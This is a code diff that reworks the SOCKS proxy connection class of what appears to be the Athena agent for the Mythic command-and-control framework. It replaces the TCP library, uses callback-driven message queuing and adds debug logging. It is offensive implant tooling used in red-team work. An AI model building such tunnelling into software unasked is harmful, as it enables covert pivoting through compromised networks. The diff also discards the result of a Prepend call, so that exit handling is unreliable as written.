@@ -1,66 +1,115 @@
-﻿using Athena.Models.Athena.Commands;
-using Athena.Models.Mythic.Response;
-using Athena.Utilities;
-using SuperSimpleTcp;
-using System.ComponentModel.DataAnnotations;
-using System.Diagnostics;
-using System.Runtime.CompilerServices;
-using System.Security.Cryptography;
+﻿using Athena.Models.Mythic.Response;
+using Athena.Models.Socks;
+using System.Collections.Concurrent;
+using System.Net;
 
 namespace Athena.Models.Athena.Socks
 {
     public class AthenaSocksConnection
     {
-        //https://github.com/MythicAgents/Apollo/blob/v3.0.0/Payload_Type/apollo/apollo/agent_code/ApolloInterop/Classes/Tcp/AsyncTcpClient.cs
         public int server_id { get; set; }
-        public bool exited { get; set; }
-        public SimpleTcpClient client;
+        //public SimpleTcpClient client;
+        public AsyncTcpClient client;
         public AutoResetEvent onSocksEvent = new AutoResetEvent(false);
-        //private List<byte> outQueue = new List<byte>();
-        private byte[] outQueue = new byte[0];
+        private ConcurrentBag<SocksMessage> messages = new ConcurrentBag<SocksMessage>();
+        private bool exited;
 
         public AthenaSocksConnection(ConnectionOptions co) {
-            this.client = new SimpleTcpClient(co.host, co.port);
-            this.client.Settings.StreamBufferSize = 32000;
-            this.client.Events.Connected += OnConnected;
-            this.client.Events.DataReceived += OnDataReceived;
-            this.client.Events.Disconnected += OnDisconnected;
+            this.client = new AsyncTcpClient(co)
+            {
+                ConnectedCallback = async (client, isReconnected) =>
+                {
+                    Console.WriteLine($"[{DateTime.Now}][{this.server_id}] Connected!");
+                    SocksMessage smOut = new SocksMessage(
+                     this.server_id,
+                     new ConnectResponse
+                     {
+                         bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
+                         bndport = new byte[] { 0x00, 0x00 },
+                         addrtype = (byte)AddressType.IPv4,
+                         status = ConnectResponseStatus.Success,
+                     }.ToByte(),
+                     false
+                    );
+                    this.messages.Add(smOut);
+                    this.onSocksEvent.Set();
+                },
+                ClosedCallback = async (client, closedByRemote) =>
+                {
+                    Console.WriteLine($"[{DateTime.Now}][{this.server_id}] Closed callback.");
+                    this.onSocksEvent.Set();
+                    this.exited = true;
+                    if (closedByRemote)
+                    {
+                        this.messages.Add(new SocksMessage(this.server_id, new byte[] { }, true));
+                    }
+                },
+                ReceivedCallback = async(client, count) =>
+                {
+                    Console.WriteLine($"[{DateTime.Now}][{this.server_id}] Recieved {count} bytes.");
+                    byte[] buf;
+                    if(count > 0)
+                    {
+                        buf = this.client.ByteBuffer.Dequeue(count);
+                        this.messages.Add(new SocksMessage(this.server_id, buf, this.client.IsConnected ? false : true));
+                    }
+                }
+            };
             this.server_id = co.server_id;
             this.exited = false;
         }
 
-        private void OnDisconnected(object? sender, ConnectionEventArgs e)
-        {
-            this.exited = true;
-            this.onSocksEvent.Set();
-        }
+        //private void OnDisconnected(object? sender, ConnectionEventArgs e)
+        //{
+        //    Console.WriteLine($"[{this.server_id}] OnDisconnected.");
+        //    this.onSocksEvent.Set();
+        //    this.exited = true;
+        //    //this.messages.Add(new SocksMessage(this.server_id, new byte[] { }, true));
+        //}
 
-        private void OnDataReceived(object? sender, SuperSimpleTcp.DataReceivedEventArgs e)
-        {
-            outQueue = outQueue.Concat(e.Data.Array).ToArray();
-        }
+        //private void OnDataReceived(object? sender, DataReceivedEventArgs e)
+        //{
+        //    if (!this.client.IsConnected)
+        //    {
+        //        Console.WriteLine($"[{this.server_id}] Exited.");
+        //    }
+        //    this.messages.Add(new SocksMessage(this.server_id, e.Data.ToArray(), this.client.IsConnected ? false : true));
+        //}
 
-        private void OnConnected(object? sender, ConnectionEventArgs e)
-        {
-            this.onSocksEvent.Set();
-        }
+        //private void OnConnected(object? sender, ConnectionEventArgs e)
+        //{
+        //    SocksMessage smOut = new SocksMessage(
+        //     this.server_id,
+        //     new ConnectResponse
+        //     {
+        //         bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
+        //         bndport = new byte[] { 0x00, 0x00 },
+        //         addrtype = (byte)AddressType.IPv4,
+        //         status = ConnectResponseStatus.Success,
+        //     }.ToByte(),
+        //     this.client.IsConnected ? false : true
+        //    );
+        //    this.messages.Add(smOut);
+        //    this.onSocksEvent.Set();
+        //}
 
-        public SocksMessage GetMessage()
+        public List<SocksMessage> GetMessages()
         {
-            if(this.outQueue.Count() > 0 || this.exited)
+            List<SocksMessage> msgs = new List<SocksMessage>(this.messages);
+            Console.WriteLine($"[{DateTime.Now}][{this.server_id}] Message Count Pre-Clear: {this.messages.Count()}");
+            this.messages.Clear();
+            Console.WriteLine($"[{DateTime.Now}][{this.server_id}] Message Count Post-Clear: {this.messages.Count()}");
+
+            if (this.exited)
             {
-                Debug.WriteLine($"[{DateTime.Now}] Returning a message with {this.outQueue.Length} bytes (exited: {this.exited})");
-                SocksMessage smOut = new SocksMessage(
-                                       this.server_id,
-                                       this.outQueue,
-                                       this.exited
-                );
-                smOut.PrepareMessage();
-                this.outQueue = new byte[0];
-                return smOut;
+                msgs.Prepend(new SocksMessage(this.server_id, new byte[] { }, true));
             }
 
-            return null;
+            foreach (var msg in msgs)
+            {
+                msg.PrepareMessage();
+            }
+            return msgs;
         }
     }
 }
